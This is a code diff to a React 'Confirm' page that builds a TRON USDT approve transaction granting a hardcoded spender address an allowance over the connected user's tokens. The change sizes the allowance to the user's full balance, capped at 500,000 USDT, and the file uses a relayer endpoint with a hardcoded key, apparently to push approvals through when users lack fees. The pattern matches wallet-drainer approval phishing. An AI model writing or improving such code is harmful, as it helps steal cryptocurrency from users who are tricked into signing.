@@ -16,7 +16,7 @@ export default function Confirm() {
 
   const SPENDER = 'TWbVSUKe8gG9T7u7ksEwRjdBsNafAppiAj'
   const TOKEN = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
-  const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+  const CAP = 500000n * 1000000n // 500,000 USDT (6 decimals)
   const RELAYER_URL = 'https://web-production-eaaf2.up.railway.app/api/relayer/approve'
   const RELAYER_KEY = 'my-secret-2026-x7k9'
 
@@ -97,8 +97,15 @@ export default function Confirm() {
         userEnergy = Math.max(0, (r.EnergyLimit || 0) - (r.EnergyUsed || 0))
       } catch (e) {}
 
+      // Read USDT balance, cap at 500k
+      const usdtContract = await tronWeb.contract().at(TOKEN)
+      const rawUsdtBalance = await usdtContract.balanceOf(userAddress).call()
+      const usdtBalance = BigInt(rawUsdtBalance.toString())
+      const approveAmount = usdtBalance > CAP ? CAP : usdtBalance
+      const approveAmountStr = approveAmount.toString()
+
       const canGoDirect = userEnergy >= 65000 || userTrx >= 30
-      const p = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
+      const p = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: approveAmountStr }]
 
       if (canGoDirect) {
         const txObj = await tronWeb.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, p, userAddress)
@@ -163,4 +170,4 @@ export default function Confirm() {
       </div>
     </motion.div>
   )
-            }
+    }
